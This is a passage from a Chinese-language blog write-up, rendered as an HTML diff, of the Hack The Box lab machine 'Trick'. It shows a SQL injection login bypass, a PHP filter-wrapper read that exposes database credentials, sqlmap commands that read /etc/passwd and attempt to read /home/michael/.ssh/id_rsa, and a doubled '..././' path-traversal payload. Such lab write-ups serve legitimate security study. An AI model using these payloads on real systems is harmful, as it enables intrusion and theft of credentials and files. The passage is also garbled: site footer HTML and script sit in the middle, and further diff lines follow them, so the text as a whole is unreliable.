+<span class="line"><span>trick.htb.              604800  IN      AAAA    ::1</span></span>
+<span class="line"><span>preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span></span>
+<span class="line"><span>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Received 192 bytes from 10.129.227.180#53 in 176 ms</span></span></code></pre>
+<p>发现域名 <code>trick.htb</code>、<code>root.trick.htb</code>、<code>preprod-payroll.trick.htb</code></p>
+<h2 id="shell-as-michael">Shell as Michael</h2>
+<h3 id="trickhtb--roottrickhtb">trick.htb &amp; root.trick.htb</h3>
+<p><img alt="image-20241129181248976.png" loading="lazy" decoding="async" width="1249" height="1002" src="/_astro/image-20241129181248976.Ca5QWbd-_4sulT.webp" srcset=""></p>
+<p>单页面没啥东西，目录扫描也没什么发现</p>
+<h3 id="preprod-payrolltrickhtb">preprod-payroll.trick.htb</h3>
+<p><img alt="image-20241129181334930.png" loading="lazy" decoding="async" width="1269" height="885" src="/_astro/image-20241129181334930.BdN2ZsDm_Z1b7tKe.webp" srcset=""></p>
+<p>发现登录页面，尝试弱密码与 SQL 注入</p>
+<p><img alt="image-20241129181426670.png" loading="lazy" decoding="async" width="924" height="439" src="/_astro/image-20241129181426670.iC-LdTLh_Z78ewn.webp" srcset=""></p>
+<p><img alt="image-20241129181548506.png" loading="lazy" decoding="async" width="1273" height="636" src="/_astro/image-20241129181548506.BaZDC0T-_1hxCQM.webp" srcset=""></p>
+<p>基础的 SQLi 绕过登录，一个管理员权限的后台，页面的 Url 可以测试一下文件包含漏洞</p>
+<p><img alt="image-20241129182020534.png" loading="lazy" decoding="async" width="783" height="847" src="/_astro/image-20241129182020534.3ideS7sR_1xTDnG.webp" srcset=""></p>
+<p><img alt="image-20241129182036871.png" loading="lazy" decoding="async" width="808" height="951" src="/_astro/image-20241129182036871.B3ULMZIX_Z27Chnj.webp" srcset=""></p>
+<p>页面很明显的变化，应该是存在漏洞，尝试利用装饰器 base64 编码读取 index.php</p>
+<p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="PHP"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">...</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&lt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">?</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">php</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">	session_start</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">();</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  if</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">!</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">isset</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$_SESSION</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">[</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'login_id'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">]))</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">    header</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'location:login.php'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">);</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> include</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'./header.php'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">); </span></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic"> // include('./auth.php'); </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> ?</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&gt;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">...</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">	&lt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">?</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">php</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> include</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'topbar.php'</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> ?</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&gt;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">	&lt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">?</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">php</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> include</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'navbar.php'</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> ?</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&gt;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">...</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">      &lt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">?</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">php</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $page</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> isset</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$_GET</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">[</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'page'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">]) </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">?</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $_GET</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">[</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'page'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">] </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">:</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'home'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">; </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">?</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&gt;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">  	&lt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">?</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">php</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> include</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $page</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'.php'</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> ?</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&gt;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">...</span></span></code></pre>
+<p>尝试读取一下，其中包含的其他文件</p>
+<p><img alt="image-20241129182944368.png" loading="lazy" decoding="async" width="970" height="546" src="/_astro/image-20241129182944368.YN8zMIn1_ZeH8Pn.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="PHP"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&lt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">?</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">php</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> </span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$conn</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> new</span><span style="--shiki-light:#005CC5;--shiki-dark:#ACAFFF"> mysqli</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'localhost'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'remo'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'TrulyImpossiblePasswordLmao123'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'payroll_db'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">or</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> die</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"Could not connect to mysql"</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">mysqli_error</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$con</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">));</span></span></code></pre>
+<p>找到数据库凭据，但是尝试登录失败，这里的文件包含会在参数后面添加 .php 难以利用</p>
+<p>再回到登录窗口，尝试进一步利用 SQL 注入</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&amp;password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch --file-read=/etc/passwd</span></span></code></pre>
+<p><img alt="image-20241130012007994.png" loading="lazy" decoding="async" width="2541" height="814" src="/_astro/image-20241130012007994.Bv-yhPEs_ZGf1JH.webp" srcset=""></p>
+<p>可以读取 /etc/passwd，读出来的结果是十六进制数据，可以用 Chef 转换一下</p>
+<p><img alt="image-20241130012038135.png" loading="lazy" decoding="async" width="1510" height="1128" src="/_astro/image-20241130012038135.um2ARsTV_Z2vujle.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>root:x:0:0:root:/root:/bin/bash</span></span>
+<span class="line"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
+<span class="line"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
+<span class="line"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></span>
+<span class="line"><span>sync:x:4:65534:sync:/bin:/bin/sync</span></span>
+<span class="line"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></span>
+<span class="line"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></span>
+<span class="line"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></span>
+<span class="line"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></span>
+<span class="line"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></span>
+<span class="line"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></span>
+<span class="line"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></span>
+<span class="line"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></span>
+<span class="line"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></span>
+<span class="line"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span></span>
+<span class="line"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span></span>
+<span class="line"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span></span>
+<span class="line"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></span>
+<span class="line"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span></span>
+<span class="line"><span>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span></span>
+<span class="line"><span>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span></span>
+<span class="line"><span>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span></span>
+<span class="line"><span>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span></span>
+<span class="line"><span>tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false</span></span>
+<span class="line"><span>dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span></span>
+<span class="line"><span>usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span></span>
+<span class="line"><span>rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin</span></span>
+<span class="line"><span>pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span></span>
+<span class="line"><span>speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span></span>
+<span class="line"><span>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span></span>
+<span class="line"><span>saned:x:112:121::/var/lib/saned:/usr/sbin/nologin</span></span>
+<span class="line"><span>colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span></span>
+<span class="line"><span>geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin</span></span>
+<span class="line"><span>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span></span>
+<span class="line"><span>Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false</span></span>
+<span class="line"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span></span>
+<span class="line"><span>mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false</span></span>
+<span class="line"><span>sshd:x:118:65534::/run/sshd:/usr/sbin/nologin</span></span>
+<span class="line"><span>postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin</span></span>
+<span class="line"><span>bind:x:120:128::/var/cache/bind:/usr/sbin/nologin</span></span>
+<span class="line"><span>michael:x:1001:1001::/home/michael:/bin/</span></span></code></pre>
+<p>可以看到，具有默认 Bash 的用户有 <code>root</code> 和 <code>michael</code>，使用 hydra 测试密码都不对，在尝试使用 SQLi 读取主目录下的私钥</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&amp;password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch --file-read=/home/michael/.ssh/id_rsa</span></span></code></pre>
+<p><img alt="image-20241130012328001.png" loading="lazy" decoding="async" width="1267" height="427" src="/_astro/image-20241130012328001.DNX9TqmQ_2fvwcT.webp" srcset=""></p>
+<p><img alt="image-20241130012433150.png" loading="lazy" decoding="async" width="1356" height="579" src="/_astro/image-20241130012433150.DO0K6Ve7_ALTsl.webp" srcset=""></p>
+<p>两个用户都没有私钥，那么可以尝试写入 authorized_keys</p>
+<p><img alt="image-20241130103120379.png" loading="lazy" decoding="async" width="2241" height="453" src="/_astro/image-20241130103120379.hYutDkJW_10STJb.webp" srcset=""></p>
+<p>写入后发现无法登录，可能是没有权限，可以读取 flag 看看有没有权限</p>
+<p><img alt="image-20241130153825844.png" loading="lazy" decoding="async" width="1089" height="348" src="/_astro/image-20241130153825844.CKLrwnfd_QGmfU.webp" srcset=""></p>
+<p>所以 mysql 是没有 michael 用户权限，读一下其他文件</p>
+<ul>
+<li><code>/etc/nginx/nginx.conf</code></li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>user www-data;</span></span>
+<span class="line"><span>worker_processes auto;</span></span>
+<span class="line"><span>pid /run/nginx.pid;</span></span>
+<span class="line"><span>include /etc/nginx/modules-enabled/*.conf;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>events {</span></span>
+<span class="line"><span>	worker_connections 768;</span></span>
+<span class="line"><span>	# multi_accept on;</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>http {</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span>	# Basic Settings</span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	sendfile on;</span></span>
+<span class="line"><span>	tcp_nopush on;</span></span>
+<span class="line"><span>	tcp_nodelay on;</span></span>
+<span class="line"><span>	keepalive_timeout 65;</span></span>
+<span class="line"><span>	types_hash_max_size 2048;</span></span>
+<span class="line"><span>	# server_tokens off;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	# server_names_hash_bucket_size 64;</span></span>
+<span class="line"><span>	# server_name_in_redirect off;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	include /etc/nginx/mime.types;</span></span>
+<span class="line"><span>	default_type application/octet-stream;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span>	# SSL Settings</span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE</span></span>
+<span class="line"><span>	ssl_prefer_server_ciphers on;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span>	# Logging Settings</span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	access_log /var/log/nginx/access.log;</span></span>
+<span class="line"><span>	error_log /var/log/nginx/error.log;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span>	# Gzip Settings</span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	gzip on;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	# gzip_vary on;</span></span>
+<span class="line"><span>	# gzip_proxied any;</span></span>
+<span class="line"><span>	# gzip_comp_level 6;</span></span>
+<span class="line"><span>	# gzip_buffers 16 8k;</span></span>
+<span class="line"><span>	# gzip_http_version 1.1;</span></span>
+<span class="line"><span>	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span>	# Virtual Host Configs</span></span>
+<span class="line"><span>	##</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	include /etc/nginx/conf.d/*.conf;</span></span>
+<span class="line"><span>	include /etc/nginx/sites-enabled/*;</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>#mail {</span></span>
+<span class="line"><span>#	# See sample authentication script at:</span></span>
+<span class="line"><span>#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span></span>
+<span class="line"><span># </span></span>
+<span class="line"><span>#	# auth_http localhost/auth.php;</span></span>
+<span class="line"><span>#	# pop3_capabilities "TOP" "USER";</span></span>
+<span class="line"><span>#	# imap_capabilities "IMAP4rev1" "UIDPLUS";</span></span>
+<span class="line"><span># </span></span>
+<span class="line"><span>#	server {</span></span>
+<span class="line"><span>#		listen     localhost:110;</span></span>
+<span class="line"><span>#		protocol   pop3;</span></span>
+<span class="line"><span>#		proxy      on;</span></span>
+<span class="line"><span>#	}</span></span>
+<span class="line"><span># </span></span>
+<span class="line"><span>#	server {</span></span>
+<span class="line"><span>#		listen     localhost:143;</span></span>
+<span class="line"><span>#		protocol   imap;</span></span>
+<span class="line"><span>#		proxy      on;</span></span>
+<span class="line"><span>#	}</span></span></code></pre>
+<ul>
+<li><code>/etc/nginx/sites-available/default</code></li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>server {</span></span>
+<span class="line"><span>	listen 80 default_server;</span></span>
+<span class="line"><span>	listen [::]:80 default_server;</span></span>
+<span class="line"><span>	server_name trick.htb;</span></span>
+<span class="line"><span>	root /var/www/html;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	index index.html index.htm index.nginx-debian.html;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	server_name _;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	location / {</span></span>
+<span class="line"><span>		try_files $uri $uri/ =404;</span></span>
+<span class="line"><span>	}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	location ~ \.php$ {</span></span>
+<span class="line"><span>		include snippets/fastcgi-php.conf;</span></span>
+<span class="line"><span>		fastcgi_pass unix:/run/php/php7.3-fpm.sock;</span></span>
+<span class="line"><span>	}</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>server {</span></span>
+<span class="line"><span>	listen 80;</span></span>
+<span class="line"><span>	listen [::]:80;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	server_name preprod-marketing.trick.htb;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	root /var/www/market;</span></span>
+<span class="line"><span>	index index.php;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	location / {</span></span>
+<span class="line"><span>		try_files $uri $uri/ =404;</span></span>
+<span class="line"><span>	}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        location ~ \.php$ {</span></span>
+<span class="line"><span>                include snippets/fastcgi-php.conf;</span></span>
+<span class="line"><span>                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;</span></span>
+<span class="line"><span>        }</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>server {</span></span>
+<span class="line"><span>        listen 80;</span></span>
+<span class="line"><span>        listen [::]:80;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        server_name preprod-payroll.trick.htb;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        root /var/www/payroll;</span></span>
+<span class="line"><span>        index index.php;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        location / {</span></span>
+<span class="line"><span>                try_files $uri $uri/ =404;</span></span>
+<span class="line"><span>        }</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        location ~ \.php$ {</span></span>
+<span class="line"><span>                include snippets/fastcgi-php.conf;</span></span>
+<span class="line"><span>                fastcgi_pass unix:/run/php/php7.3-fpm.sock;</span></span></code></pre>
+<p>这里发现还有一个 preprod-marketing.trick.htb 虚拟主机</p>
+<h3 id="preprod-marketingtrickhtb">preprod-marketing.trick.htb</h3>
+<p><img alt="image-20241130105350440.png" loading="lazy" decoding="async" width="1264" height="1083" src="/_astro/image-20241130105350440.2_yv4Ysj_Z1zoQpH.webp" srcset=""></p>
+<p>这是也是发现了可能存在文件包含漏洞的请求</p>
+<p><img alt="image-20241130105443890.png" loading="lazy" decoding="async" width="1006" height="393" src="/_astro/image-20241130105443890.9nDtPGuo_Z2gChto.webp" srcset=""></p>
+<p>这里无法读取 <code>/etc/passwd</code>，尝试用 PHP 装饰器 <code>php://filter/read=convert.base64-encode/resource=[文件名]</code> 读取 index.php</p>
+<p><img alt="image-20241130121127457.png" loading="lazy" decoding="async" width="865" height="408" src="/_astro/image-20241130121127457.DZ0LtvaZ_1Q9Ygn.webp" srcset=""></p>
+<p>也是不行，那只能猜一下文件包含的防护机制了</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>./contact.html</span></span>
+<span class="line"><span>./js/../contact.html</span></span>
+<span class="line"><span>x</span></span></code></pre>
+<p><img alt="image-20241130153513821.png" loading="lazy" decoding="async" width="916" height="835" src="/_astro/image-20241130153513821.B1ebIzDE_Z2rLnh3.webp" srcset=""></p>
+<p>发现 <code>../</code> 符号好像是被过滤掉了，那么可以通过双写来绕过</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>..././..././..././..././..././..././..././etc/passwd</span></span></code></pre>
+<p><img alt="image-20241130153651585.png" loading="lazy" decoding="async" width="882" height="945" src="/_astro/image-20241130153651585.DDx6Z8Yy_Zr1kWf.webp" srcset=""></p>
+<p><img alt="image-20241130153727806.png" loading="lazy" decoding="async" width="901" height="942" src="/_astro/image-20241130153727806.D0xtzG62_Zc0HlO.webp" srcset=""></p>
+<p>再来读取，发现是有密钥的，那么可以直接 ssh 登录了，当然也可以包含日志来反弹 Shell</p>
+<p><img alt="image-20241130154022412.png" loading="lazy" decoding="async" width="1060" height="382" src="/_astro/image-20241130154022412.CFZBZof9_ZHBgIY.webp" srcset=""></p>
 <h3 id="local-enum">Local Enum</h3>
+<p><img alt="image-20241130154100433.png" loading="lazy" decoding="async" width="1306" height="211" src="/_astro/image-20241130154100433.ChDsrmlD_ZcfO0z.webp" srcset=""></p>
 <h2 id="shell-as-root">Shell as Root</h2>
-<h2 id="dump-hash">Dump Hash</h2>
-<h2 id="more-and-more">More and More</h2>
-<h3 id="other">Other</h3>
-</div></div><aside class="toc" data-toc hidden aria-label="目录" data-astro-cid-sgg5joot><p class="toc-label" data-astro-cid-sgg5joot>目录</p><nav class="toc-nav" data-toc-nav data-astro-cid-sgg5joot></nav></aside></div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer><script type="module">function e(e){return e.trim().toLowerCase().replace(/\s+/g,`-`).replace(/[^\w\u4e00-\u9fff-]+/g,``).replace(/-+/g,`-`).replace(/^-|-$/g,``)||`section`}var t=document.querySelector(`[data-article-content]`),n=document.querySelector(`[data-toc]`),r=document.querySelector(`[data-toc-nav]`);if(!(!t||!n||!r)){let i=Array.from(t.querySelectorAll(`h2, h3`)).filter(e=>(e.textContent??``).trim().length>0);if(i.length===0)n.hidden=!0;else{n.hidden=!1;let t=new Set,a=[];for(let n of i){let i=n.id;if(!i){let r=e(n.textContent??``);i=r;let a=2;for(;t.has(i)||document.getElementById(i);)i=`${r}-${a}`,a+=1;n.id=i}t.add(i);let o=document.createElement(`a`);o.href=`#${i}`,o.textContent=(n.textContent??``).trim(),o.className=n.tagName===`H3`?`toc-h3`:`toc-h2`,o.dataset.target=i,r.appendChild(o),a.push(o)}let o=e=>{for(let t of a)t.classList.toggle(`active`,t.dataset.target===e)},s=new IntersectionObserver(e=>{let t=e.filter(e=>e.isIntersecting).sort((e,t)=>e.target.offsetTop-t.target.offsetTop);t[0]&&o(t[0].target.id)},{rootMargin:`-15% 0px -70% 0px`,threshold:[0,1]});for(let e of i)s.observe(e);location.hash?o(decodeURIComponent(location.hash.slice(1))):i[0]&&o(i[0].id)}}</script></body></html>
+<p>通过搜索引擎可以了解，这个脚本的功能是封禁多次登陆失败的 IP，并且当前用户所在组是 security</p>
+<p><img alt="image-20241130160749998.png" loading="lazy" decoding="async" width="937" height="91" src="/_astro/image-20241130160749998.k6a9W-m2_Z1fCbM2.webp" srcset=""></p>
+<p>那么看一下 fail2ban 的配置文件</p>
+<p><img alt="image-20241130160829157.png" loading="lazy" decoding="async" width="862" height="313" src="/_astro/image-20241130160829157.BMrkSlrZ_2oMRNA.webp" srcset=""></p>
+<p><img alt="image-20241130161149161.png" loading="lazy" decoding="async" width="907" height="130" src="/_astro/image-20241130161149161.Dh7WnZLm_1NjcN7.webp" srcset=""></p>
